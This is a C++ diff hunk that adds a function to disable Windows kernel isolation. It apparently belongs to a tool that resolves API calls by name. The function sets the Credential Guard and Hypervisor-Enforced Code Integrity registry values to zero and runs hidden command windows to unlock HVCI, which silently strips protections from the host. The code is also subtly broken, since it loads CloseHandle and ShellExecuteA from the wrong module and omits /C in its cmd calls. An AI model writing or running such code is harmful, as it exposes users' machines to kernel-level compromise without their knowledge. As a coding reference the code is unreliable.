@@ -143,6 +143,22 @@ VOID EnableHyperV()
 	Call::CallFunction(SHELL32, "ShellExecuteA", 0, "open", "cmd", "/C bcdedit /set hypervisorlaunchtype auto", NULL, SW_HIDE);
 }
 
+// 禁用内核隔离
+VOID DisableHvci()
+{
+	HKEY Key;
+	ULONG Value = 0;
+	Call::CallFunction(ADVAPI32, "RegOpenKeyA", HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard", &Key);
+	Call::CallFunction(ADVAPI32, "RegSetValueExA", Key, "Enabled", 0, REG_DWORD, (const BYTE*)&Value, sizeof(Value));
+	Call::CallFunction(ADVAPI32, "CloseHandle", Key);
+	Call::CallFunction(ADVAPI32, "RegOpenKeyA", HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity", &Key);
+	Call::CallFunction(ADVAPI32, "RegSetValueExA", Key, "Enabled", 0, REG_DWORD, (const BYTE*)&Value, sizeof(Value));
+	Call::CallFunction(ADVAPI32, "CloseHandle", Key);
+	Call::CallFunction(ADVAPI32,"ShellExecuteA", 0, "open", "cmd", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f", NULL, SW_HIDE);
+	Call::CallFunction(ADVAPI32,"ShellExecuteA", 0, "open", "cmd", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f", NULL, SW_HIDE);
+}
+
+
 // 获取服务列表
 std::pair<ENUM_SERVICE_STATUS_PROCESSA*, DWORD> GetSvcList(int ServiceState, int ServiceType)
 {
